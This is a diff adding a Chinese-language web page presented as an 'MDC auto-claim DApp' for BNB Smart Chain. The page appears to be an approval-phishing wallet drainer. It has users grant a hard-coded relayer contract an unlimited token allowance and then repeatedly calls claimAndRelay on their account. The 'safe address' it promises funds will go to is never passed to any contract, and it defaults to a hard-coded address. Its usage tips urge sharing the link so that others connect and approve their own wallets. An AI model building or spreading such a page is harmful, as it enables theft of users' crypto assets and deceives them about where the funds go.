@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MDC 自动领取 DApp</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+      min-height: 100vh;
+      color: #fff;
+      padding: 20px;
+    }
+    .container { max-width: 800px; margin: 0 auto; }
+    h1 { text-align: center; margin-bottom: 30px; color: #00d4ff; }
+    
+    .card {
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 16px;
+      padding: 24px;
+      margin-bottom: 20px;
+      backdrop-filter: blur(10px);
+    }
+    .card h2 { margin-bottom: 16px; color: #00d4ff; font-size: 18px; }
+    
+    .btn {
+      background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
+      color: #000;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 16px;
+      font-weight: bold;
+      width: 100%;
+      margin-top: 12px;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .btn:hover { transform: translateY(-2px); box-shadow: 0 4px 20px rgba(0, 212, 255, 0.4); }
+    .btn:disabled { background: #666; cursor: not-allowed; transform: none; }
+    .btn-secondary { background: linear-gradient(135deg, #666 0%, #444 100%); }
+    .btn-danger { background: linear-gradient(135deg, #ff4444 0%, #cc0000 100%); color: #fff; }
+    
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 8px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.1);
+    }
+    .info-row:last-child { border-bottom: none; }
+    .label { color: #888; }
+    .value { color: #00d4ff; font-family: monospace; word-break: break-all; text-align: right; max-width: 60%; }
+    
+    .status { padding: 12px; border-radius: 8px; margin-top: 12px; font-size: 14px; }
+    .status.success { background: rgba(0, 255, 100, 0.2); border: 1px solid #00ff64; }
+    .status.error { background: rgba(255, 0, 0, 0.2); border: 1px solid #ff4444; }
+    .status.loading { background: rgba(0, 212, 255, 0.2); border: 1px solid #00d4ff; }
+    .status.warning { background: rgba(255, 200, 0, 0.2); border: 1px solid #ffc800; }
+    
+    .auto-status { text-align: center; padding: 16px; border-radius: 8px; margin-top: 12px; font-size: 18px; font-weight: bold; }
+    .auto-status.running { background: rgba(0, 255, 100, 0.2); border: 2px solid #00ff64; animation: pulse 2s infinite; }
+    @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }
+    .countdown { font-size: 14px; color: #888; margin-top: 8px; }
+    
+    input {
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      border: 1px solid rgba(255,255,255,0.2);
+      background: rgba(0,0,0,0.3);
+      color: #fff;
+      font-size: 14px;
+      margin-top: 8px;
+    }
+    input:focus { outline: none; border-color: #00d4ff; }
+    
+    .tip {
+      font-size: 12px;
+      color: #888;
+      margin-top: 8px;
+      padding: 8px;
+      background: rgba(0,0,0,0.3);
+      border-radius: 4px;
+    }
+    
+    .copy-btn {
+      padding: 4px 8px;
+      font-size: 12px;
+      border-radius: 4px;
+      border: none;
+      background: rgba(0,212,255,0.3);
+      color: #00d4ff;
+      cursor: pointer;
+    }
+    .copy-btn:hover { background: rgba(0,212,255,0.5); }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>MDC 自动领取 DApp</h1>
+    
+    <!-- 钱包连接 -->
+    <div class="card">
+      <h2>连接钱包</h2>
+      <button class="btn" id="connectBtn" onclick="connectWallet()">
+        连接钱包
+      </button>
+      <div id="walletArea" style="display:none;">
+        <div class="info-row">
+          <span class="label">当前账户 (监控地址)</span>
+          <span class="value" id="walletAddress"></span>
+        </div>
+        <div class="info-row">
+          <span class="label">BNB余额</span>
+          <span class="value" id="bnbBalance"></span>
+        </div>
+      </div>
+      <div id="networkWarning" class="status warning" style="display:none;">
+        ⚠️ 请切换到 BSC 网络 (Chain ID: 56)
+      </div>
+    </div>
+    
+    <!-- 一键自动领取 -->
+    <div class="card">
+      <h2>一键自动领取</h2>
+      <div class="info-row">
+        <span class="label">状态</span>
+        <span class="value" id="autoStatus">已停止</span>
+      </div>
+      
+      <div class="auto-status" id="autoStatusArea" style="display:none;">
+        🔄 自动运行中...
+        <div class="countdown" id="countdown">30秒后检查</div>
+      </div>
+      
+      <button class="btn" id="autoBtn" onclick="toggleAuto()" disabled>
+        启动自动领取
+      </button>
+      <button class="btn btn-danger" id="stopBtn" onclick="stopAuto()" disabled>
+        停止自动领取
+      </button>
+      
+      <div id="logArea" style="margin-top: 16px;"></div>
+    </div>
+    
+    <!-- 余额信息 -->
+    <div class="card">
+      <h2>余额信息</h2>
+      <button class="btn btn-secondary" id="refreshBtn" onclick="refreshBalances()" disabled>
+        刷新余额
+      </button>
+      
+      <div id="balanceArea" style="margin-top: 16px;">
+        <div class="info-row"><span class="label">可领取MDC</span><span class="value" id="claimable">-</span></div>
+        <div class="info-row"><span class="label">当前MDC余额</span><span class="value" id="balance">-</span></div>
+        <div class="info-row"><span class="label">已授权代付合约</span><span class="value" id="allowance">-</span></div>
+        <div class="info-row"><span class="label">安全地址</span><span class="value" id="safeAddress"></span></div>
+      </div>
+    </div>
+    
+    <!-- 授权 -->
+    <div class="card">
+      <h2>授权代付合约</h2>
+      <p style="color:#888; font-size: 14px;">
+        需要授权代付合约才能自动转账您的MDC
+      </p>
+      <button class="btn" id="approveBtn" onclick="approveRelayer()" disabled>
+        授权代付合约
+      </button>
+    </div>
+    
+    <!-- 手动操作 -->
+    <div class="card">
+      <h2>手动领取</h2>
+      <button class="btn" id="claimBtn" onclick="claimAndTransfer()" disabled>
+        领取并转账到安全地址
+      </button>
+    </div>
+    
+    <!-- 设置 -->
+    <div class="card">
+      <h2>安全地址设置</h2>
+      <label>安全地址 (收益将转到这里):</label>
+      <input type="text" id="safeAddressInput" placeholder="输入安全地址">
+      <button class="btn btn-secondary" id="saveSafeBtn" onclick="saveSafeAddress()">
+        保存安全地址
+      </button>
+      <div class="tip">
+        💡 安全地址会保存在浏览器本地，不会上传到服务器
+      </div>
+    </div>
+    
+    <!-- 分享说明 -->
+    <div class="card">
+      <h2>分享使用</h2>
+      <div class="info-row">
+        <span class="label">当前访问地址</span>
+        <span class="value" style="max-width: 70%;">
+          <span id="currentUrl"></span>
+          <button class="copy-btn" onclick="copyUrl()">复制</button>
+        </span>
+      </div>
+      <div class="tip">
+        💡 <strong>使用说明：</strong><br>
+        1. 将此链接分享给别人<br>
+        2. 对方打开后，连接自己的钱包<br>
+        3. <strong>监控地址自动变为对方的钱包地址</strong><br>
+        4. 设置自己的安全地址（收益将转到这里）<br>
+        5. 授权代付合约后即可自动领取<br><br>
+        
+        🚀 <strong>公网部署方案：</strong><br>
+        <ul style="margin-top: 8px; padding-left: 20px;">
+          <li>GitHub Pages - 免费，无需服务器</li>
+          <li>Vercel / Netlify - 免费托管</li>
+          <li>自己的服务器 - 上传index.html即可</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  
+  <script>
+    const CONFIG = {
+      chainId: 56,
+      MDC_TOKEN: '0xd1ba69a44888ee50819c554d3d6f4ee457622894',
+      CLAIM_CONTRACT: '0xEc5DBf2BACe283143b7B4472a7ce0E445EDA3F1e',
+      RELAYER_CONTRACT: '0x25c38ceF48702fE94376c207F5b14Ce4AFc0297B',
+      RELAYER_ADDRESS: '0x8010Ab81beDd6c965a1aa727f5322Fed3ceb03a1',
+      MIN_AMOUNT: 0.05,
+      CHECK_INTERVAL: 30000,
+    };
+    
+    const RPC_LIST = [
+      'https://bsc-dataseed2.defibit.io/',
+      'https://bscrpc.com/',
+      'https://rpc.ankr.com/bsc',
+      'https://bsc-dataseed1.ninicoin.io/',
+      'https://bsc-dataseed2.ninicoin.io/',
+    ];
+    
+    const MDC_ABI = [
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
+    ];
+    
+    const CLAIM_ABI = [
+      { "constant": true, "inputs": [{ "name": "account", "type": "address" }], "name": "claimable", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "account", "type": "address" }], "name": "claim", "outputs": [], "type": "function" }
+    ];
+    
+    const RELAYER_ABI = [
+      { "constant": false, "inputs": [{ "name": "from", "type": "address" }], "name": "claimAndRelay", "outputs": [], "type": "function" },
+      { "constant": false, "inputs": [{ "name": "from", "type": "address" }], "name": "relay", "outputs": [], "type": "function" }
+    ];
+    
+    let web3;
+    let currentAccount;
+    let safeAddress;
+    let autoInterval;
+    let countdownInterval;
+    let isAutoRunning = false;
+    
+    // 初始化
+    async function init() {
+      // 设置当前URL
+      document.getElementById('currentUrl').textContent = window.location.href;
+      
+      // 加载安全地址
+      loadSafeAddress();
+      
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+      } else {
+        await connectBestRPC();
+      }
+      
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          currentAccount = accounts[0];
+          updateWalletUI();
+          await checkNetwork();
+        }
+      } catch (e) {}
+    }
+    
+    // 加载安全地址
+    function loadSafeAddress() {
+      const saved = localStorage.getItem('mdc_safe_address');
+      if (saved) {
+        safeAddress = saved;
+        document.getElementById('safeAddressInput').value = saved;
+        document.getElementById('safeAddress').textContent = saved;
+      } else {
+        // 默认安全地址
+        safeAddress = '0x8558D8A5b90eC7d9f500cdCF0FB49C47292EBCdA';
+        document.getElementById('safeAddressInput').value = safeAddress;
+        document.getElementById('safeAddress').textContent = safeAddress;
+      }
+    }
+    
+    // 保存安全地址
+    function saveSafeAddress() {
+      const address = document.getElementById('safeAddressInput').value.trim();
+      if (address && web3.utils.isAddress(address)) {
+        safeAddress = address;
+        localStorage.setItem('mdc_safe_address', address);
+        document.getElementById('safeAddress').textContent = address;
+        showLog('安全地址已保存', 'success');
+      } else {
+        showLog('请输入有效的以太坊地址', 'error');
+      }
+    }
+    
+    // 复制URL
+    function copyUrl() {
+      navigator.clipboard.writeText(window.location.href).then(() => {
+        showLog('链接已复制', 'success');
+      });
+    }
+    
+    // 连接最佳RPC
+    async function connectBestRPC() {
+      for (const rpcUrl of RPC_LIST) {
+        try {
+          web3 = new Web3(new Web3.providers.HttpProvider(rpcUrl));
+          await web3.eth.getBlockNumber();
+          return;
+        } catch (e) {}
+      }
+      throw new Error('无法连接到任何RPC节点');
+    }
+    
+    // 连接钱包
+    async function connectWallet() {
+      if (typeof window.ethereum === 'undefined') {
+        showLog('请安装 MetaMask 钱包!', 'error');
+        return;
+      }
+      
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+        currentAccount = accounts[0];
+        updateWalletUI();
+        await checkNetwork();
+        await refreshBalances();
+      } catch (e) {
+        showLog('连接失败: ' + e.message, 'error');
+      }
+    }
+    
+    // 检查网络
+    async function checkNetwork() {
+      try {
+        const chainId = await web3.eth.getChainId();
+        const warningEl = document.getElementById('networkWarning');
+        
+        if (chainId !== CONFIG.chainId) {
+          warningEl.style.display = 'block';
+          setButtonsDisabled(true);
+          showLog('请切换到BSC主网', 'warning');
+          
+          try {
+            await window.ethereum.request({
+              method: 'wallet_switchEthereumChain',
+              params: [{ chainId: '0x38' }],
+            });
+            warningEl.style.display = 'none';
+            setButtonsDisabled(false);
+          } catch (e) {}
+        } else {
+          warningEl.style.display = 'none';
+          setButtonsDisabled(false);
+        }
+      } catch (e) {
+        console.error('检查网络失败:', e);
+      }
+    }
+    
+    function setButtonsDisabled(disabled) {
+      ['refreshBtn', 'autoBtn', 'claimBtn', 'approveBtn'].forEach(id => {
+        const el = document.getElementById(id);
+        if (el) el.disabled = disabled;
+      });
+    }
+    
+    function updateWalletUI() {
+      document.getElementById('walletArea').style.display = 'block';
+      document.getElementById('walletAddress').textContent = currentAccount;
+      document.getElementById('connectBtn').textContent = '已连接 ✓';
+      document.getElementById('connectBtn').disabled = true;
+      
+      web3.eth.getBalance(currentAccount).then(balance => {
+        document.getElementById('bnbBalance').textContent = 
+          (Number(balance) / 1e18).toFixed(6) + ' BNB';
+      });
+    }
+    
+    function formatAmount(wei, decimals = 18) {
+      if (!wei) return '0';
+      return (Number(wei) / Math.pow(10, decimals)).toFixed(6);
+    }
+    
+    function showLog(msg, type = 'loading') {
+      const el = document.getElementById('logArea');
+      const div = document.createElement('div');
+      div.className = 'status ' + type;
+      div.textContent = msg;
+      el.insertBefore(div, el.firstChild);
+      while (el.children.length > 5) el.removeChild(el.lastChild);
+    }
+    
+    async function refreshBalances() {
+      if (!currentAccount) return;
+      
+      const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
+      const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
+      
+      try {
+        const [claimable, balance, allowance] = await Promise.all([
+          claimContract.methods.claimable(currentAccount).call(),
+          mdcContract.methods.balanceOf(currentAccount).call(),
+          mdcContract.methods.allowance(currentAccount, CONFIG.RELAYER_CONTRACT).call(),
+        ]);
+        
+        document.getElementById('claimable').textContent = formatAmount(claimable) + ' MDC';
+        document.getElementById('balance').textContent = formatAmount(balance) + ' MDC';
+        document.getElementById('allowance').textContent = Number(allowance) > 0 ? '✅ 已授权' : '❌ 未授权';
+        
+        const total = (Number(claimable) + Number(balance)) / 1e18;
+        document.getElementById('claimBtn').disabled = total < CONFIG.MIN_AMOUNT || Number(allowance) === 0;
+        
+      } catch (e) {
+        console.error('刷新余额失败:', e);
+        showLog('刷新失败: ' + e.message, 'error');
+      }
+    }
+    
+    async function claimAndTransfer() {
+      if (!currentAccount) return;
+      
+      document.getElementById('claimBtn').disabled = true;
+      showLog('正在领取...', 'loading');
+      
+      try {
+        const relayerContract = new web3.eth.Contract(RELAYER_ABI, CONFIG.RELAYER_CONTRACT);
+        
+        const tx = await relayerContract.methods.claimAndRelay(currentAccount).send({
+          from: currentAccount,
+          gas: 200000,
+          gasPrice: '100000000',
+        });
+        
+        showLog(`领取成功! 交易: ${tx.transactionHash.slice(0, 16)}...`, 'success');
+        await refreshBalances();
+        
+      } catch (e) {
+        console.error('领取失败:', e);
+        showLog(`领取失败: ${e.message || e}`, 'error');
+        document.getElementById('claimBtn').disabled = false;
+      }
+    }
+    
+    // 授权
+    async function approveRelayer() {
+      if (!currentAccount) return;
+      
+      document.getElementById('approveBtn').disabled = true;
+      showLog('正在授权...', 'loading');
+      
+      try {
+        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
+        const maxUint = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
+        
+        const tx = await mdcContract.methods.approve(CONFIG.RELAYER_CONTRACT, maxUint).send({
+          from: currentAccount,
+          gas: 100000,
+          gasPrice: '100000000',
+        });
+        
+        showLog(`授权成功! 交易: ${tx.transactionHash.slice(0, 16)}...`, 'success');
+        await refreshBalances();
+        
+      } catch (e) {
+        console.error('授权失败:', e);
+        showLog(`授权失败: ${e.message || e}`, 'error');
+        document.getElementById('approveBtn').disabled = false;
+      }
+    }
+    
+    async function toggleAuto() {
+      if (isAutoRunning) {
+        stopAuto();
+        return;
+      }
+      
+      isAutoRunning = true;
+      document.getElementById('autoStatus').textContent = '运行中';
+      document.getElementById('autoStatus').style.color = '#00ff64';
+      document.getElementById('autoStatusArea').style.display = 'block';
+      document.getElementById('autoStatusArea').classList.add('running');
+      document.getElementById('autoBtn').disabled = true;
+      document.getElementById('stopBtn').disabled = false;
+      
+      showLog('自动领取已启动', 'success');
+      await autoCheck();
+      
+      let countdown = CONFIG.CHECK_INTERVAL / 1000;
+      document.getElementById('countdown').textContent = `${countdown}秒后检查`;
+      
+      countdownInterval = setInterval(() => {
+        countdown--;
+        if (countdown <= 0) countdown = CONFIG.CHECK_INTERVAL / 1000;
+        document.getElementById('countdown').textContent = `${countdown}秒后检查`;
+      }, 1000);
+      
+      autoInterval = setInterval(autoCheck, CONFIG.CHECK_INTERVAL);
+    }
+    
+    function stopAuto() {
+      isAutoRunning = false;
+      clearInterval(autoInterval);
+      clearInterval(countdownInterval);
+      
+      document.getElementById('autoStatus').textContent = '已停止';
+      document.getElementById('autoStatus').style.color = '#ff4444';
+      document.getElementById('autoStatusArea').style.display = 'none';
+      document.getElementById('autoStatusArea').classList.remove('running');
+      document.getElementById('autoBtn').disabled = false;
+      document.getElementById('stopBtn').disabled = true;
+      
+      showLog('自动领取已停止', 'warning');
+    }
+    
+    async function autoCheck() {
+      if (!isAutoRunning || !currentAccount) return;
+      
+      showLog('正在检查...', 'loading');
+      
+      try {
+        const mdcContract = new web3.eth.Contract(MDC_ABI, CONFIG.MDC_TOKEN);
+        const claimContract = new web3.eth.Contract(CLAIM_ABI, CONFIG.CLAIM_CONTRACT);
+        
+        const [claimable, balance, allowance] = await Promise.all([
+          claimContract.methods.claimable(currentAccount).call(),
+          mdcContract.methods.balanceOf(currentAccount).call(),
+          mdcContract.methods.allowance(currentAccount, CONFIG.RELAYER_CONTRACT).call(),
+        ]);
+        
+        if (Number(allowance) > 0 && (Number(claimable) + Number(balance)) / 1e18 >= CONFIG.MIN_AMOUNT) {
+          showLog('满足条件，正在领取...', 'loading');
+          await claimAndTransfer();
+        }
+        
+        showLog('检查完成', 'success');
+        await refreshBalances();
+        
+      } catch (e) {
+        showLog('检查失败: ' + (e.message || e), 'error');
+      }
+    }
+    
+    if (window.ethereum) {
+      window.ethereum.on('accountsChanged', (accounts) => {
+        if (accounts.length > 0) {
+          currentAccount = accounts[0];
+          updateWalletUI();
+          refreshBalances();
+        } else {
+          window.location.reload();
+        }
+      });
+      
+      window.ethereum.on('chainChanged', () => {
+        window.location.reload();
+      });
+    }
+    
+    init();
+  </script>
+</body>
+</html>
